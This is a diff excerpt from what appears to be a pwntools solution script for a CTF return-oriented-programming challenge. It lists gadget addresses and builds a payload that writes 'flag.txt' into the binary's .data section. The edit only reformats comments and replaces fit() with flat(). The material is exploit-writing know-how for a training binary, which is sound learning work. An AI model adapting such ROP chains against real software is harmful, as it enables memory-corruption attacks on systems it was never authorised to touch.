@@ -25,11 +25,11 @@ straddr -- 0x00601028 (to r14)
 gadget  -> pop r14; pop r15; ret; 
 --- LOW  ---
 '''
-pop_r14_r15 = 0x0000000000400690  # pop r14; pop r15; ret; 
-write_data = 0x0000000000400628  # mov qword ptr [r14], r15; ret;
-straddr = 0x00601028  # .data
-pop_rdi = 0x0000000000400693  # pop rdi; ret;
-payload = fit(
+pop_r14_r15 = 0x0000000000400690  # pop r14; pop r15; ret;
+write_data = 0x0000000000400628   # mov qword ptr [r14], r15; ret;
+straddr = 0x00601028              # .data
+pop_rdi = 0x0000000000400693      # pop rdi; ret;
+payload = flat(
     { offset : pop_r14_r15 },
     straddr,
     b'flag.txt',
